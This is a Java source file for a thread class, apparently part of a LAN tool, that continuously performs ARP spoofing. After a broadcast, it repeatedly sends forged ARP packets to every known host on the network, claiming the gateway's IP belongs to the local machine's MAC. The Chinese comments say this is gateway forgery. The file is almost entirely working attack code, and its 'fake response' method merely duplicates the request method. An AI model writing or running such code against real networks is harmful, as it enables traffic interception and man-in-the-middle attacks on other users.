package org.jasic.qzoner.core;
import jpcap.packet.ARPPacket;
import org.jasic.qzoner.common.GlobalCaches;
import org.jasic.qzoner.common.Globalvariables;
import org.jasic.qzoner.core.entity.IpMacPair;
import org.jasic.qzoner.util.NetWorkUtil;
import org.jasic.qzoner.util.PacketGener;
import org.jasic.utils.TimeUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.jasic.utils.StringUtils.fieldval2Map;
import static org.jasic.utils.StringUtils.mapToString;
/**
 * User: Jasic
 * Date: 13-9-16
 */
@SuppressWarnings("unchecked")
public class ArpStrategy extends Thread {

    private static final Logger logger = LoggerFactory.getLogger(ArpStrategy.class);
    private static final String logHeader = "[Arp策略]-";

    private long interval;
    private IpMacPair localIpMacPair;

    public ArpStrategy() {
        String mac = Globalvariables.MAC_LOCAL_ETH_0;
        this.interval = Globalvariables.ARP_STRATEGY_INTERVAL;
        this.localIpMacPair = new IpMacPair(NetWorkUtil.getIpByMac(mac), mac);
        this.localIpMacPair.setSubNet(NetWorkUtil.getSubNetByMac(mac));
    }

    public ArpStrategy(IpMacPair ipMacPair) {
        this.localIpMacPair = ipMacPair;
    }

    @Override
    public void run() {
        while (!isInterrupted()) {
            try {
                // 1、arp广播请求
                List bs = brocasStrategy();
                // 2、伪造网关请请
                List fqs = fakeReqStrategy();
                // 3、伪造网关响应
                List fps = fakeRepStrategy();

                if (bs.size() != 0) {
                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(bs);
                    logger.info(bs.toString());
                    TimeUtil.sleep(2);
                }

                if (fqs.size() != 0) {
                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(fqs);
                    logger.info(mapToString(fieldval2Map(fqs)));
                    TimeUtil.sleep(2);
                }
                if (fps.size() != 0) {
                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(fps);
                    logger.info(mapToString(fieldval2Map(fps)));
                }
                TimeUtil.sleep(this.interval);
            } catch (Exception e) {
                e.printStackTrace();
                logger.info(logHeader + e.getMessage());
            }
        }
    }

    /**
     * 广播策略请求
     */
    private List<ARPPacket> brocasStrategy() throws UnknownHostException, InterruptedException {
        List<ARPPacket> arpPackets = PacketGener.genBrocastArp(this.localIpMacPair, true);
        return arpPackets;
    }

    /**
     * 指定欺骗请求
     */
    private List<ARPPacket> fakeReqStrategy() throws InterruptedException, UnknownHostException {

        List<ARPPacket> arpPacketList = new ArrayList<ARPPacket>();
        IpMacPair gateWay = Globalvariables.GATE_WAY_IP_MAC_PAIR;
        Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);

        if (gateWay == null || availIpMacs.size() == 0) {
            logger.info(logHeader + "GateWay is not available [" + fieldval2Map(gateWay) + "]");
            return arpPacketList;
        }

        // 伪造网关ip-mac对
        IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());

        for (IpMacPair ipMacPair : availIpMacs.values()) {
            ARPPacket packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
            arpPacketList.add(packet);
        }
        return arpPacketList;
    }

    /**
     * 指定欺骗响应
     * 因为不使用广播欺骗能减少网络阻塞，和不发送给网关。
     */
    private List<ARPPacket> fakeRepStrategy() throws InterruptedException, UnknownHostException {
        List<ARPPacket> arpPacketList = new ArrayList<ARPPacket>();
        IpMacPair gateWay = Globalvariables.GATE_WAY_IP_MAC_PAIR;
        Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);

        if (gateWay == null || availIpMacs.size() == 0) {
            logger.info(logHeader + "GateWay is not available [" + fieldval2Map(gateWay) + "]");
            return arpPacketList;
        }

        // 伪造网关ip-mac对
        IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());

        for (IpMacPair ipMacPair : availIpMacs.values()) {
            ARPPacket packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
            arpPacketList.add(packet);
        }
        return arpPacketList;
    }
}
